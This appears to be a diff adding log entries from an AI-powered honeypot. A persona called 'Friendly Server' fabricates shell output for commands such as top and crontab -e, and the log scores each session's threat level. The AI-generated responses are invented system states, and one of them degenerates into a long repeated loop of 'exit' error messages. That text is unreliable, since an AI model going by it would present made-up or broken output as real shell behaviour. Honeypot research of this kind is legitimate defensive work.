for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry",
+    "selected_personality": {
+        "name": "Friendly Server",
+        "hostname": "friendly-srv",
+        "user": "support",
+        "style": "friendly",
+        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
+        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
+    },
+    "threat_score": {
+        "score": 1,
+        "risk_level": "LOW",
+        "final_score": 1,
+        "threat_level": "LOW",
+        "base_score": 1,
+        "multiplier": 1.0,
+        "severity_indicator": "\ud83d\udfe2"
+    },
+    "attacker_profile": {
+        "curiosity": {
+            "commands_executed": 1,
+            "unique_commands": 1,
+            "directories_visited": 0,
+            "recon_commands": 0,
+            "persistence_attempts": 0,
+            "curiosity_score": 5
+        },
+        "engagement": {
+            "session_duration": 0,
+            "commands_executed": 1,
+            "successful_commands": 1,
+            "failed_commands": 0,
+            "files_accessed": 0,
+            "services_accessed": 0,
+            "engagement_score": 4,
+            "engagement_level": "LOW"
+        },
+        "behaviour": {
+            "Curiosity Score": 5,
+            "Persistence Score": "LOW",
+            "Interaction Depth": "LOW",
+            "Risk Score": 1,
+            "Session Complexity": "LOW"
+        },
+        "commands": [
+            "top\nexit"
+        ],
+        "confidence_score": 0.55
+    }
+}
+2026-07-17 11:55:18,260 - {"session_id": "452255e6", "command": "top\nexit", "attack_type": "Unknown", "risk_score": 1, "threat_level": "LOW"}
+2026-07-17 11:55:18,260 - {
+    "session_id": "452255e6",
+    "command": "top\nexit",
+    "ai_decision": "exit\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry",
+    "confidence_score": 0.5,
+    "conversation_metadata": {
+        "conversation_id": "452255e6",
+        "interaction_count": 1
+    },
+    "prediction_result": {
+        "next_prediction": "Reconnaissance",
+        "prediction_confidence": 0.5
+    },
+    "risk_score": 1,
+    "threat_level": "LOW"
+}
+2026-07-17 11:55:18,260 - {
+    "session_id": "452255e6",
+    "conversation_log": "Attacker executed: top\nexit",
+    "ai_decision": "exit\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry 'exit --help' for more information.\n\nexit\nbash: exit: exit: invalid option\nTry",
+    "session_metadata": {
+        "prediction": "Reconnaissance"
+    },
+    "system_event": "AI Deception Generated",
+    "security_event": "Unknown",
+    "warning": null,
+    "error": null
+}
+2026-07-17 11:55:43,999 - {
+    "session_id": "452255e6",
+    "query": "top",
+    "response": "top - 15:21:05 up 2 days, 18 min,  1 user,  load average: 0.00, 0.01, 0.05\nTasks: 104 total,   1 running, 103 sleeping,   0 stopped,   0 zombie\n%Cpu(s):  0.3 us,  0.1 sy,  0.0 ni, 99.6 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st\nMiB Mem :   1984.3 total,   1245.1 free,    312.4 used,    426.8 buff/cache\nMiB Swap:   2048.0 total,   2048.0 free,      0.0 used.   1512.2 avail Mem \n\n  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND\n    1 root      20   0  168340  11824   8292 S   0.0   0.6   0:02.11 systemd\n  221 root      20   0   15820   8204   7210 S   0.0   0.4   0:00.45 sshd\n  334 mysql     20   0 1832048 245210  32104 S   0.0  12.1   4:12.33 mysqld\n  510 www-data  20   0   56214   8410   6124 S   0.0   0.4   0:01.05 nginx\n 1120 ubuntu    20   0   22452   4120   3210 S   0.0   0.2   0:00.15 bash",
+    "selected_personality": {
+        "name": "Friendly Server",
+        "hostname": "friendly-srv",
+        "user": "support",
+        "style": "friendly",
+        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
+        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
+    },
+    "threat_score": {
+        "score": 2,
+        "risk_level": "LOW",
+        "final_score": 2,
+        "threat_level": "LOW",
+        "base_score": 2,
+        "multiplier": 1.0,
+        "severity_indicator": "\ud83d\udfe2"
+    },
+    "attacker_profile": {
+        "curiosity": {
+            "commands_executed": 2,
+            "unique_commands": 2,
+            "directories_visited": 0,
+            "recon_commands": 0,
+            "persistence_attempts": 0,
+            "curiosity_score": 10
+        },
+        "engagement": {
+            "session_duration": 27,
+            "commands_executed": 2,
+            "successful_commands": 2,
+            "failed_commands": 0,
+            "files_accessed": 0,
+            "services_accessed": 0,
+            "engagement_score": 21,
+            "engagement_level": "LOW"
+        },
+        "behaviour": {
+            "Curiosity Score": 10,
+            "Persistence Score": "LOW",
+            "Interaction Depth": "LOW",
+            "Risk Score": 2,
+            "Session Complexity": "LOW"
+        },
+        "commands": [
+            "top\nexit",
+            "top"
+        ],
+        "confidence_score": 0.6
+    }
+}
+2026-07-17 11:55:43,999 - {"session_id": "452255e6", "command": "top", "attack_type": "Unknown", "risk_score": 2, "threat_level": "LOW"}
+2026-07-17 11:55:44,000 - {
+    "session_id": "452255e6",
+    "command": "top",
+    "ai_decision": "top - 15:21:05 up 2 days, 18 min,  1 user,  load average: 0.00, 0.01, 0.05\nTasks: 104 total,   1 running, 103 sleeping,   0 stopped,   0 zombie\n%Cpu(s):  0.3 us,  0.1 sy,  0.0 ni, 99.6 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st\nMiB Mem :   1984.3 total,   1245.1 free,    312.4 used,    426.8 buff/cache\nMiB Swap:   2048.0 total,   2048.0 free,      0.0 used.   1512.2 avail Mem \n\n  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND\n    1 root      20   0  168340  11824   8292 S   0.0   0.6   0:02.11 systemd\n  221 root      20   0   15820   8204   7210 S   0.0   0.4   0:00.45 sshd\n  334 mysql     20   0 1832048 245210  32104 S   0.0  12.1   4:12.33 mysqld\n  510 www-data  20   0   56214   8410   6124 S   0.0   0.4   0:01.05 nginx\n 1120 ubuntu    20   0   22452   4120   3210 S   0.0   0.2   0:00.15 bash",
+    "confidence_score": 0.5,
+    "conversation_metadata": {
+        "conversation_id": "452255e6",
+        "interaction_count": 2
+    },
+    "prediction_result": {
+        "next_prediction": "Reconnaissance",
+        "prediction_confidence": 0.5
+    },
+    "risk_score": 2,
+    "threat_level": "LOW"
+}
+2026-07-17 11:55:44,000 - {
+    "session_id": "452255e6",
+    "conversation_log": "Attacker executed: top",
+    "ai_decision": "top - 15:21:05 up 2 days, 18 min,  1 user,  load average: 0.00, 0.01, 0.05\nTasks: 104 total,   1 running, 103 sleeping,   0 stopped,   0 zombie\n%Cpu(s):  0.3 us,  0.1 sy,  0.0 ni, 99.6 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st\nMiB Mem :   1984.3 total,   1245.1 free,    312.4 used,    426.8 buff/cache\nMiB Swap:   2048.0 total,   2048.0 free,      0.0 used.   1512.2 avail Mem \n\n  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND\n    1 root      20   0  168340  11824   8292 S   0.0   0.6   0:02.11 systemd\n  221 root      20   0   15820   8204   7210 S   0.0   0.4   0:00.45 sshd\n  334 mysql     20   0 1832048 245210  32104 S   0.0  12.1   4:12.33 mysqld\n  510 www-data  20   0   56214   8410   6124 S   0.0   0.4   0:01.05 nginx\n 1120 ubuntu    20   0   22452   4120   3210 S   0.0   0.2   0:00.15 bash",
+    "session_metadata": {
+        "prediction": "Reconnaissance"
+    },
+    "system_event": "AI Deception Generated",
+    "security_event": "Unknown",
+    "warning": null,
+    "error": null
+}
+2026-07-17 11:55:45,941 - {
+    "session_id": "452255e6",
+    "query": "crontab -e",
+    "response": "no crontab for ubuntu - using an empty one\n\nSelect an editor.  To change later, run 'select-editor'.\n  1. /bin/nano        <---- easiest\n  2. /usr/bin/vim.basic\n  3. /usr/bin/vim.tiny\n  4. /bin/ed\n\nChoose 1-4 [1]:",
+    "selected_personality": {
+        "name": "Friendly Server",
+        "hostname": "friendly-srv",
+        "user": "support",
+        "style": "friendly",
+        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
+        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
+    },
+    "threat_score": {
+        "score": 14,
+        "risk_level": "LOW",
+        "final_score": 14,
+        "threat_level": "LOW",
+        "base_score": 14,
+        "multiplier": 1.0,
+        "severity_indicator": "\ud83d\udfe2"
+    },
+    "attacker_profile": {
+        "curiosity": {
+            "commands_executed": 3,
+            "unique_commands": 3,
+            "directories_visited": 0,
+            "recon_commands": 0,
+            "persistence_attempts": 0,
+            "curiosity_score": 15
+        },
+        "engagement": {
+            "session_duration": 29,
+            "commands_executed": 3,
+            "successful_commands": 3,
+            "failed_commands": 0,
+            "files_accessed": 0,
+            "services_accessed": 0,
+            "engagement_score": 26,
+            "engagement_level": "LOW"
+        },
+        "behaviour": {
+            "Curiosity Score": 15,
+            "Persistence Score": "LOW",
+            "Interaction Depth": "LOW",
+            "Risk Score": 14,
+            "Session Complexity": "LOW"
+        },
+        "commands": [
+            "top\nexit",
+            "top",
+            "crontab -e"
+        ],
+        "confidence_score": 0.65
+    }
+}
+2026-07-17 11:55:45,941 - {"session_id": "452255e6", "command": "crontab -e", "attack_type": "Persistence Attempt", "risk_score": 14, "threat_level": "LOW"}
+2026-07-17 11:55:45,941 - {
+    "session_id": "452255e6",
+    "command": "crontab -e",
+    "ai_decision": "no crontab for ubuntu - using an empty one\n\nSelect an editor.  To change later, run 'select-editor'.\n  1. /bin/nano        <---- easiest\n  2. /usr/bin/vim.basic\n  3. /usr/bin/vim.tiny\n  4. /bin/ed\n\nChoose 1-4 [1]:",
+    "confidence_score": 0.9,
+    "conversation_metadata": {
+        "conversation_id": "452255e6",
+        "interaction_count": 3
+    },
+    "prediction_result": {
+        "next_prediction": "Reconnaissance",
+        "prediction_confidence": 0.9
+    },
+    "risk_score": 14,
+    "threat_level": "LOW"
+}
+2026-07-17 11:55:45,941 - {
+    "session_id": "452255e6",
+    "conversation_log": "Attacker executed: crontab -e",
+    "ai_decision": "no crontab for ubuntu - using an empty one\n\nSelect an editor.  To change later, run 'select-editor'.\n  1. /bin/nano        <---- easiest\n  2. /usr/bin/vim.basic\n  3. /usr/bin/vim.tiny\n  4. /bin/ed\n\nChoose 1-4 [1]:",
+    "session_metadata": {
+        "prediction": "Reconnaissance"
+    },
+    "system_event": "AI Deception Generated",
+    "security_event": "Persistence Attempt",
+    "warning": null,
+    "error": null
+}
+2026-07-17 17:27:14,243 - {
+    "session_id": "d11579c9",
+    "query": "top",
+    "response": "top - 15:21:05 up 2 days, 18 min,  1 user,  load average: 0.00, 0.01, 0.05\nTasks: 104 total,   1 running, 103 sleeping,   0 stopped,   0 zombie\n%Cpu(s):  0.3 us,  0.1 sy,  0.0 ni, 99.6 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st\nMiB Mem :   1984.3 total,   1245.1 free,    312.4 used,    426.8 buff/cache\nMiB Swap:   2048.0 total,   2048.0 free,      0.0 used.   1512.2 avail Mem \n\n  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND\n    1 root      20   0  168340  11824   8292 S   0.0   0.6   0:02.11 systemd\n  221 root      20   0   15820   8204   7210 S   0.0   0.4   0:00.45 sshd\n  334 mysql     20   0 1832048 245210  32104 S   0.0  12.1   4:12.33 mysqld\n  510 www-data  20   0   56214   8410   6124 S   0.0   0.4   0:01.05 nginx\n 1120 ubuntu    20   0   22452   4120   3210 S   0.0   0.2   0:00.15 bash",
+    "selected_personality": {
+        "name": "Friendly Server",
+        "hostname": "friendly-srv",
+        "user": "support",
+        "style": "friendly",
+        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
+        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
+    },
+    "threat_score": {
+        "score": 1,
+        "risk_level": "LOW",
+        "final_score": 1,
+        "threat_level": "LOW",
+        "base_score": 1,
+        "multiplier": 1.0,
+        "severity_indicator": "\ud83d\udfe2"
+    },
+    "attacker_profile": {
+        "curiosity": {
+            "commands_executed": 1,
+            "unique_commands": 1,
+            "directories_visited": 0,
+            "recon_commands": 0,
+            "persistence_attempts": 0,
+            "curiosity_score": 5
+        },
+        "engagement": {
+            "session_duration": 0,
+            "commands_executed": 1,
+            "successful_commands": 1,
+            "failed_commands": 0,
+            "files_accessed": 0,
+            "services_accessed": 0,
+            "engagement_score": 4,
+            "engagement_level": "LOW"
+        },
+        "behaviour": {
+            "Curiosity Score": 5,
+            "Persistence Score": "LOW",
+            "Interaction Depth": "LOW",
+            "Risk Score": 1,
+            "Session Complexity": "LOW"
+        },
+        "commands": [
+            "top"
+        ],
+        "confidence_score": 0.55
+    }
+}
+2026-07-17 17:27:14,243 - {"session_id": "d11579c9", "command": "top", "attack_type": "Unknown", "risk_score": 1, "threat_level": "LOW"}
+2026-07-17 17:27:14,243 - {
+    "session_id": "d11579c9",
+    "command": "top",
+    "ai_decision": "top - 15:21:05 up 2 days, 18 min,  1 user,  load average: 0.00, 0.01, 0.05\nTasks: 104 total,   1 running, 103 sleeping,   0 stopped,   0 zombie\n%Cpu(s):  0.3 us,  0.1 sy,  0.0 ni, 99.6 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st\nMiB Mem :   1984.3 total,   1245.1 free,    312.4 used,    426.8 buff/cache\nMiB Swap:   2048.0 total,   2048.0 free,      0.0 used.   1512.2 avail Mem \n\n  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND\n    1 root      20   0  168340  11824   8292 S   0.0   0.6   0:02.11 systemd\n  221 root      20   0   15820   8204   7210 S   0.0   0.4   0:00.45 sshd\n  334 mysql     20   0 1832048 245210  32104 S   0.0  12.1   4:12.33 mysqld\n  510 www-data  20   0   56214   8410   6124 S   0.0   0.4   0:01.05 nginx\n 1120 ubuntu    20   0   22452   4120   3210 S   0.0   0.2   0:00.15 bash",
+    "confidence_score": 0.5,
+    "conversation_metadata": {
+        "conversation_id": "d11579c9",
+        "interaction_count": 1
+    },
+    "prediction_result": {
+        "next_prediction": "Reconnaissance",
+        "prediction_confidence": 0.5
+    },
+    "risk_score": 1,
+    "threat_level": "LOW"
+}
+2026-07-17 17:27:14,243 - {
+    "session_id": "d11579c9",
+    "conversation_log": "Attacker executed: top",
+    "ai_decision": "top - 15:21:05 up 2 days, 18 min,  1 user,  load average: 0.00, 0.01, 0.05\nTasks: 104 total,   1 running, 103 sleeping,   0 stopped,   0 zombie\n%Cpu(s):  0.3 us,  0.1 sy,  0.0 ni, 99.6 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st\nMiB Mem :   1984.3 total,   1245.1 free,    312.4 used,    426.8 buff/cache\nMiB Swap:   2048.0 total,   2048.0 free,      0.0 used.   1512.2 avail Mem \n\n  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND\n    1 root      20   0  168340  11824   8292 S   0.0   0.6   0:02.11 systemd\n  221 root      20   0   15820   8204   7210 S   0.0   0.4   0:00.45 sshd\n  334 mysql     20   0 1832048 245210  32104 S   0.0  12.1   4:12.33 mysqld\n  510 www-data  20   0   56214   8410   6124 S   0.0   0.4   0:01.05 nginx\n 1120 ubuntu    20   0   22452   4120   3210 S   0.0   0.2   0:00.15 bash",
+    "session_metadata": {
+        "prediction": "Reconnaissance"
+    },
+    "system_event": "AI Deception Generated",
+    "security_event": "Unknown",
+    "warning": null,
+    "error": null
+}
+2026-07-17 17:27:16,223 - {
+    "session_id": "d11579c9",
+    "query": "crontab -e",
+    "response": "no crontab for ubuntu - using an empty one\n\nSelect an editor.  To change later, run 'select-editor'.\n  1. /bin/nano        <---- easiest\n  2. /usr/bin/vim.basic\n  3. /usr/bin/vim.tiny\n  4. /bin/ed\n\nChoose 1-4 [1]:",
+    "selected_personality": {
+        "name": "Friendly Server",
+        "hostname": "friendly-srv",
+        "user": "support",
+        "style": "friendly",
+        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
+        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
+    },
+    "threat_score": {
+        "score": 13,
+        "risk_level": "LOW",
+        "final_score": 13,
+        "threat_level": "LOW",
+        "base_score": 13,
+        "multiplier": 1.0,
+        "severity_indicator": "\ud83d\udfe2"
+    },
+    "attacker_profile": {
+        "curiosity": {
+            "commands_executed": 2,
+            "unique_commands": 2,
+            "directories_visited": 0,
+            "recon_commands": 0,
+            "persistence_attempts": 0,
+            "curiosity_score": 10
+        },
+        "engagement": {
+            "session_duration": 1,
+            "commands_executed": 2,
+            "successful_commands": 2,
+            "failed_commands": 0,
+            "files_accessed": 0,
+            "services_accessed": 0,
+            "engagement_score": 8,
+            "engagement_level": "LOW"
+        },
+        "behaviour": {
+            "Curiosity Score": 10,
+            "Persistence Score": "LOW",
+            "Interaction Depth": "LOW",
+            "Risk Score": 13,
+            "Session Complexity": "LOW"
+        },
+        "commands": [
+            "top",
+            "crontab -e"
+        ],
+        "confidence_score": 0.6
+    }
+}
+2026-07-17 17:27:16,223 - {"session_id": "d11579c9", "command": "crontab -e", "attack_type": "Persistence Attempt", "risk_score": 13, "threat_level": "LOW"}
+2026-07-17 17:27:16,223 - {
+    "session_id": "d11579c9",
+    "command": "crontab -e",
+    "ai_decision": "no crontab for ubuntu - using an empty one\n\nSelect an editor.  To change later, run 'select-editor'.\n  1. /bin/nano        <---- easiest\n  2. /usr/bin/vim.basic\n  3. /usr/bin/vim.tiny\n  4. /bin/ed\n\nChoose 1-4 [1]:",
+    "confidence_score": 0.9,
+    "conversation_metadata": {
+        "conversation_id": "d11579c9",
+        "interaction_count": 2
+    },
+    "prediction_result": {
+        "next_prediction": "Reconnaissance",
+        "prediction_confidence": 0.9
+    },
+    "risk_score": 13,
+    "threat_level": "LOW"
+}
+2026-07-17 17:27:16,223 - {
+    "session_id": "d11579c9",
+    "conversation_log": "Attacker executed: crontab -e",
+    "ai_decision": "no crontab for ubuntu - using an empty one\n\nSelect an editor.  To change later, run 'select-editor'.\n  1. /bin/nano        <---- easiest\n  2. /usr/bin/vim.basic\n  3. /usr/bin/vim.tiny\n  4. /bin/ed\n\nChoose 1-4 [1]:",
+    "session_metadata": {
+        "prediction": "Reconnaissance"
+    },
+    "system_event": "AI Deception Generated",
+    "security_event": "Persistence Attempt",
+    "warning": null,
+    "error": null
+}
+2026-07-23 17:05:06,433 - {
+    "session_id": "f9d563c9",
+    "query": "top",
+    "response": "top - 15:21:05 up 2 days, 18 min,  1 user,  load average: 0.00, 0.01, 0.05\nTasks: 104 total,   1 running, 103 sleeping,   0 stopped,   0 zombie\n%Cpu(s):  0.3 us,  0.1 sy,  0.0 ni, 99.6 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st\nMiB Mem :   1984.3 total,   1245.1 free,    312.4 used,    426.8 buff/cache\nMiB Swap:   2048.0 total,   2048.0 free,      0.0 used.   1512.2 avail Mem \n\n  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND\n    1 root      20   0  168340  11824   8292 S   0.0   0.6   0:02.11 systemd\n  221 root      20   0   15820   8204   7210 S   0.0   0.4   0:00.45 sshd\n  334 mysql     20   0 1832048 245210  32104 S   0.0  12.1   4:12.33 mysqld\n  510 www-data  20   0   56214   8410   6124 S   0.0   0.4   0:01.05 nginx\n 1120 ubuntu    20   0   22452   4120   3210 S   0.0   0.2   0:00.15 bash",
+    "selected_personality": {
+        "name": "Friendly Server",
+        "hostname": "friendly-srv",
+        "user": "support",
+        "style": "friendly",
+        "description": "Helpful and polite, behaves like an unhardened server with welcoming banners",
+        "response_style": "helpful, overly polite, returns detailed and welcoming system messages"
+    },
+    "threat_score": {
+        "score": 1,
+        "risk_level": "LOW",
+        "final_score": 1,
+        "threat_level": "LOW",
+        "base_score": 1,
+        "multiplier": 1.0,
+        "severity_indicator": "\ud83d\udfe2"
+    },
+    "attacker_profile": {
+        "curiosity": {
+            "commands_executed": 1,
+            "unique_commands": 1,
+            "directories_visited": 0,
+            "recon_commands": 0,
+            "persistence_attempts": 0,
+            "curiosity_score": 5
+        },
+        "engagement": {
+            "session_duration": 0,
+            "commands_executed": 1,
+            "successful_commands": 1,
+            "failed_commands": 0,
+            "files_accessed": 0,
+            "services_accessed": 0,
+            "engagement_score": 4,
+            "engagement_level": "LOW"
+        },
+        "behaviour": {
+            "Curiosity Score": 5,
+            "Persistence Score": "LOW",
+            "Interaction Depth": "LOW",
+            "Risk Score": 1,
+            "Session Complexity": "LOW"
+        },
+        "commands": [
+            "top"
+        ],
+        "confidence_score": 0.55
+    }
+}
+2026-07-23 17:05:06,433 - {"session_id": "f9d563c9", "command": "top", "attack_type": "Unknown", "risk_score": 1, "threat_level": "LOW"}
+2026-07-23 17:05:06,434 - {
+    "session_id": "f9d563c9",
+    "command": "top",
+    "ai_decision": "top - 15:21:05 up 2 days, 18 min,  1 user,  load average: 0.00, 0.01, 0.05\nTasks: 104 total,   1 running, 103 sleeping,   0 stopped,   0 zombie\n%Cpu(s):  0.3 us,  0.1 sy,  0.0 ni, 99.6 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st\nMiB Mem :   1984.3 total,   1245.1 free,    312.4 used,    426.8 buff/cache\nMiB Swap:   2048.0 total,   2048.0 free,      0.0 used.   1512.2 avail Mem \n\n  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND\n    1 root      20   0  168340  11824   8292 S   0.0   0.6   0:02.11 systemd\n  221 root      20   0   15820   8204   7210 S   0.0   0.4   0:00.45 sshd\n  334 mysql     20   0 1832048 245210  32104 S   0.0  12.1   4:12.33 mysqld\n  510 www-data  20   0   56214   8410   6124 S   0.0   0.4   0:01.05 nginx\n 1120 ubuntu    20   0   22452   4120   3210 S   0.0   0.2   0:00.15 bash",
+    "confidence_score": 0.5,
+    "conversation_metadata": {
+        "conversation_id": "f9d563c9",
+        "interaction_count": 1
+    },
+    "prediction_result": {
+        "next_prediction": "Reconnaissance",
+        "prediction_confidence": 0.5
+    },
+    "risk_score": 1,
+    "threat_level": "LOW"
+}
+2026-07-23 17:05:06,434 - {
+    "session_id": "f9d563c9",
+    "conversation_log": "Attacker executed: top",
